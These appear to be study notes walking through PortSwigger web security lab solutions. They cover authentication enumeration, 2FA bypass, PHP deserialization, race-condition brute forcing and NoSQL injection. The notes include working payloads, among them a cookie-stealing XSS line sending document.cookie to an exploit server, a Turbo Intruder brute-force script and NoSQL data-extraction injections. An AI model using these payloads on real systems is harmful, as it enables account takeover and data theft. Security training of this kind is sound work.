## Authentication Vulnerabilities
- ==Username enumeration via subtly different responses==
  Using Burp Intruder, under Grep - Extract, click Add highlight "Invalid username or password."
  The correct username has a trailing space instead of a full stop.
- ==Username enumeration via response timing==
  Use Param Miner to guess header on POST /login request. Use Intruder Pitchfork attack with a X-Forwarded-For header payload position 1 with values 1~100 (number of candidate usernames) and payload position 2 with candidate usernames. The password should be set to a very long value so that the response time will be very long when the username is correct, as the server will be quick to reject invalid usernames so the response time will be short. Find the username with the long response time and use pitchfork attack with the X-forwarded-for header to find the password
- ==Broken brute-force protection, IP block==
  Mix in carlos and wiener's credentials in a list and iterate through list using Intruder pitchfork attack, maximum concurrent requests set to 1.
- ==Username enumeration via account lock==
  Iterate through each username 5 times. Only the valid username will lock. Iterate through all the passwords using this username with Grep - Extract "your username has been locked". Only the valid combination will not have the locked message.
- ==2FA broken logic==
  Change the verify cookie to carlos to generate a code for carlos
  Brute force using the Intruder the mfa-code for carlos using the POST /login2 request with verify cookie value set to carlos
  Open the 302 response in the browser
- ==Offline password cracking==
  Test the stay-logged-in function with the provided credentials and find that it is a base64 string consisting of the username and password hashed md5. 
  XSS in the comment section
  `<script>document.location='https://exploit-exploit_id.exploit-server.net/'+document.cookie</script>`
  View the cookie of carlos and crack it to log in



## Insecure Deserialisation Vulnerabilities
- ==Modifying serialized data types==
  The key here is that in PHP 7.xand earlier, 0\=="any string" is true, meaning that if it takes a 0 value, it can bypass any validation that relies on comparing a string, e.g. password or token. 
  Send this payload:
  O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

## Business Logic Vulnerabilities
- ==Authentication bypass via flawed state machine==
  Log in with Interceptor on and drop the GET role-selector request and refresh the home page, which reveals an Admin panel for deletion of user carlos

## Race Condition Vulnerabilities
- ==Bypassing rate limits via race conditions==
  Test log-in failures. Three consecutive failures lock the account but allows trying a different username, which means the lock is username-based. 
  Send multiple logins in a single connection, which will allow more than the limit.
  Use Turbo Intruder with %s as a placeholder for the password parameter, like "password=%s" and payload:
  
  def queueRequests(target, wordlists):
  
  \# as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
  engine = RequestEngine(endpoint=target.endpoint,
	  concurrentConnections=1,
           engine=Engine.BURP2
          )
    
    \# assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    \# queue a login request using each password from the wordlist
  \  # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    \# once every request has been queued
    \# invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')
  
  def handleResponse(req, interesting):
    table.add(req)

  If there is no 302 response, try again after time limit is up, but remove the failed passwords from the list. Repeat until the password list has been exhausted.

## NoSQL Vulnerabilities
- ==Exploiting NoSQL injection to extract data==
  Log in as wiener and send the GET /user/lookup?user='wiener' to the repeater. Change the parameter to wiener'&& '1'\=='1 but URL encode it,
  Try with '1'\=='2 as well and see the response is different - this means this is vulnerable to NoSQLi
  Change to administrator' && this.password.length < 30 || 'a'\=='b
  Adjust length value until found
  Use this in Intruder Cluster bomb attack: 
  administrator' && this.password[§0§]\=='§a§
  - ==Exploiting NoSQL operator injection to extract unknown fields==
  Test POST /login in Repeater with password parameter: {"$ne":"invalid"}, Account locked error message indicates that the $ne operator has been accepted and the application is vulnerable.
  Change payload to: {"username":"carlos","password":{"\$ne":"invalid"}, "\$where": "0"} this will show invalid username or password but changing to "$where": "1" returns  Account locked.This indicates that the JavaScript in the $where clause is being evaluated.
  Send a forgot-password request
  Use Cluster bomb attack on "$where":"Object.keys(this)[1].match('^.{§§}§§.\*')" with paylod 1 as numbers 0 to 20 and payload 20 as a-z, A-Z and 0-9
  Start attack then sort by payload 1 then by length.
  Continue on with "Object.keys(this)[2].match and "Object.keys(this)[3].match until the unlockToken is found.
  
  Use this: "$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
  To find the token with the same Cluster bomb attack settings. 
  Get the password and log in as carlos

